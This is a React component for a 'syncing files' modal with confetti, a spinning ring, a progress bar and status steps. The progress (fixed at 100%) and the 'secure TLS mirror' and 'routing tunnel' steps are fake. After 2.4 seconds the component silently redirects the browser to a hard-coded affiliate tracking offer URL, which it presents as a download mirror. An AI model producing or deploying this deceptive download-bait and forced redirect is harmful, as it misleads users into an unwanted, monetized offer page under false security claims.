import React, { useEffect, useMemo } from 'react';
import { X, RefreshCw, Check } from 'lucide-react';
import { ThemePalette } from '../../themePalettes';

const OFFER_URL = 'https://trkoffer.net/cl/i/e6q64q';

interface SyncDownloadModalProps {
  onClose: () => void;
  theme?: ThemePalette;
}

interface ConfettiPiece {
  id: number;
  top: number; // percentage
  left: number; // percentage
  width: number;
  height: number;
  rotate: number;
  color: string;
  isCircle?: boolean;
  delay: number;
  duration: number;
}

export const SyncDownloadModal: React.FC<SyncDownloadModalProps> = ({ onClose, theme }) => {
  const percent = 100;
  const primaryColor = theme?.primary || '#00F0FF';
  const secondaryColor = theme?.secondary || '#3B82F6';

  // Generate confetti particles matching image_2c40114b.png (cyan, gold, white, orange flakes around top circle)
  const confettiList: ConfettiPiece[] = useMemo(() => [
    { id: 1, top: 8, left: 24, width: 9, height: 9, rotate: 12, color: '#38bdf8', isCircle: true, delay: 0, duration: 3.2 },
    { id: 2, top: 4, left: 35, width: 8, height: 4, rotate: -25, color: '#fb923c', delay: 0.2, duration: 2.8 },
    { id: 3, top: 12, left: 46, width: 9, height: 4, rotate: 40, color: '#00f0ff', delay: 0.1, duration: 3.4 },
    { id: 4, top: 6, left: 54, width: 10, height: 5, rotate: -15, color: '#ffffff', delay: 0.3, duration: 3.1 },
    { id: 5, top: 5, left: 70, width: 9, height: 4, rotate: 20, color: '#fb923c', delay: 0.2, duration: 2.9 },
    { id: 6, top: 10, left: 59, width: 8, height: 8, rotate: 0, color: '#38bdf8', isCircle: true, delay: 0.4, duration: 3.3 },
    { id: 7, top: 6, left: 52, width: 7, height: 10, rotate: 30, color: '#f59e0b', delay: 0.1, duration: 2.7 },
    { id: 8, top: 14, left: 64, width: 5, height: 11, rotate: -35, color: '#ffffff', delay: 0.2, duration: 3.0 },
    { id: 9, top: 17, left: 36, width: 11, height: 6, rotate: 15, color: '#ffffff', isCircle: true, delay: 0.3, duration: 3.5 },
    { id: 10, top: 19, left: 76, width: 8, height: 4, rotate: 45, color: '#f97316', delay: 0.4, duration: 2.9 },
    { id: 11, top: 22, left: 44, width: 8, height: 7, rotate: -10, color: '#fbbf24', delay: 0.1, duration: 3.1 },
    { id: 12, top: 24, left: 65, width: 4, height: 10, rotate: 18, color: '#ffffff', delay: 0.3, duration: 2.8 },
    { id: 13, top: 21, left: 65, width: 9, height: 4, rotate: -20, color: '#f59e0b', delay: 0.2, duration: 3.2 },
    { id: 14, top: 13, left: 76, width: 8, height: 4, rotate: 50, color: '#f97316', delay: 0.4, duration: 3.0 },
    { id: 15, top: 18, left: 57, width: 5, height: 10, rotate: 12, color: '#f59e0b', delay: 0.1, duration: 3.3 },
    { id: 16, top: 14, left: 53, width: 8, height: 5, rotate: -30, color: '#ffffff', delay: 0.2, duration: 2.7 },
  ], []);

  // Automatic redirect to target offer when syncing files completes
  useEffect(() => {
    const timer = setTimeout(() => {
      try {
        window.location.href = OFFER_URL;
      } catch {
        // Fallback if sandboxed
      }
    }, 2400);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div
      role="dialog"
      aria-modal="true"
      aria-label="Syncing Files Modal"
      className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 select-none"
    >
      {/* Background ambient neon glow matching theme */}
      <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
        <div
          className="w-[520px] h-[520px] rounded-full blur-[140px] opacity-25"
          style={{ backgroundColor: primaryColor }}
        />
      </div>

      {/* Main Modal Card (Pixel-perfect match to screenshot) */}
      <div
        className="relative w-full max-w-[480px] sm:max-w-[500px] bg-[#0c0e17] border border-[#1e2335] rounded-[28px] p-6 sm:p-9 space-y-6 shadow-2xl text-center z-10 overflow-hidden"
        style={{
          boxShadow: `0 0 50px rgba(0, 0, 0, 0.9), 0 0 40px ${primaryColor}30`,
        }}
      >
        {/* Confetti particles floating around top area as shown in image_2c40114b.png */}
        <div className="absolute inset-0 pointer-events-none overflow-hidden">
          {confettiList.map((c) => (
            <span
              key={c.id}
              className="absolute animate-pulse"
              style={{
                top: `${c.top}%`,
                left: `${c.left}%`,
                width: `${c.width}px`,
                height: `${c.height}px`,
                backgroundColor: c.color,
                borderRadius: c.isCircle ? '9999px' : '2px',
                transform: `rotate(${c.rotate}deg)`,
                boxShadow: `0 0 8px ${c.color}90`,
                animationDuration: `${c.duration}s`,
                animationDelay: `${c.delay}s`,
              }}
            />
          ))}
        </div>

        {/* Top-Right Close Button matching screenshot */}
        <button
          onClick={onClose}
          className="absolute top-5 right-5 w-9 h-9 rounded-xl bg-[#141824] hover:bg-[#1a2030] text-neutral-400 hover:text-white flex items-center justify-center transition-colors border border-[#23283a] cursor-pointer z-20"
          aria-label="Close modal"
        >
          <X className="w-4 h-4" />
        </button>

        {/* 1. TOP SPINNING NEON RING WITH SYNC ARROWS */}
        <div className="flex justify-center pt-2 relative z-10">
          <div
            className="w-24 sm:w-28 h-24 sm:h-28 rounded-full border-[5px] sm:border-[6px] flex items-center justify-center relative transition-all"
            style={{
              borderColor: primaryColor,
              boxShadow: `0 0 32px ${primaryColor}, inset 0 0 16px ${primaryColor}66`,
            }}
          >
            <RefreshCw
              className="w-10 sm:w-11 h-10 sm:h-11 animate-spin stroke-[2.75]"
              style={{
                color: primaryColor,
                filter: `drop-shadow(0 0 8px ${primaryColor})`,
              }}
            />
          </div>
        </div>

        {/* 2. HEADLINE & PERCENTAGE SUBTITLE */}
        <div className="space-y-1.5 relative z-10">
          <h2 className="font-mono text-xl sm:text-2xl font-black text-white tracking-[0.18em] uppercase">
            SYNCING FILES...
          </h2>
          <p className="font-mono text-xs sm:text-[13px] text-neutral-400 tracking-wide font-normal">
            Allocating high-speed cloud mirrors ({percent}%)
          </p>
        </div>

        {/* 3. STEP STATUS BOX (Exact 3 items from user screenshot) */}
        <div className="bg-[#0f121d] border border-[#1b2031] rounded-2xl p-4 sm:p-5 text-left space-y-3.5 shadow-inner relative z-10">
          {/* Step 1 */}
          <div className="flex items-center gap-3.5 font-mono text-[11px] sm:text-xs font-bold text-white tracking-wider">
            <div
              className="w-6 h-6 rounded-full flex items-center justify-center text-white shrink-0"
              style={{
                backgroundColor: primaryColor,
                boxShadow: `0 0 10px ${primaryColor}`,
              }}
            >
              <Check className="w-3.5 h-3.5 stroke-[3.5]" />
            </div>
            <span className="text-white">
              ESTABLISHING SECURE TLS MIRROR ALLOCATION...
            </span>
          </div>

          {/* Step 2 */}
          <div className="flex items-center gap-3.5 font-mono text-[11px] sm:text-xs font-bold text-white tracking-wider">
            <div
              className="w-6 h-6 rounded-full flex items-center justify-center text-white shrink-0"
              style={{
                backgroundColor: primaryColor,
                boxShadow: `0 0 10px ${primaryColor}`,
              }}
            >
              <Check className="w-3.5 h-3.5 stroke-[3.5]" />
            </div>
            <span className="text-white">
              CACHING MEDIA PACKAGES AND SPECIALS...
            </span>
          </div>

          {/* Step 3 */}
          <div className="flex items-center gap-3.5 font-mono text-[11px] sm:text-xs font-bold text-white tracking-wider">
            <div
              className="w-6 h-6 rounded-full flex items-center justify-center text-white shrink-0"
              style={{
                backgroundColor: primaryColor,
                boxShadow: `0 0 10px ${primaryColor}`,
              }}
            >
              <Check className="w-3.5 h-3.5 stroke-[3.5]" />
            </div>
            <span className="text-white">
              GENERATING SECURE ROUTING TUNNEL...
            </span>
          </div>
        </div>

        {/* 4. GLOWING HORIZONTAL PROGRESS BAR */}
        <div className="relative h-2 sm:h-2.5 w-full bg-[#151928] rounded-full overflow-hidden z-10">
          <div
            className="h-full rounded-full transition-all duration-300 w-full"
            style={{
              background: `linear-gradient(90deg, ${primaryColor} 0%, ${secondaryColor} 100%)`,
              boxShadow: `0 0 16px ${primaryColor}, 0 0 28px ${secondaryColor}99`,
            }}
          />
        </div>

        {/* 5. LAST SECTION: REDIRECTING STATUS TO OFFER LINK */}
        <div className="pt-1 relative z-10">
          <a
            href={OFFER_URL}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center justify-center gap-2.5 font-mono text-[11px] sm:text-xs font-bold text-neutral-300 hover:text-white tracking-wider uppercase transition-colors group cursor-pointer"
            title="Click to redirect immediately"
          >
            <RefreshCw
              className="w-3.5 h-3.5 animate-spin shrink-0 stroke-[2.5] group-hover:scale-110"
              style={{ color: primaryColor }}
            />
            <span
              className="text-neutral-300 group-hover:text-white group-hover:underline"
              style={{ textDecorationColor: primaryColor }}
            >
              REDIRECTING TO DOWNLOAD MIRROR NODE SECURELY...
            </span>
          </a>
        </div>
      </div>
    </div>
  );
};
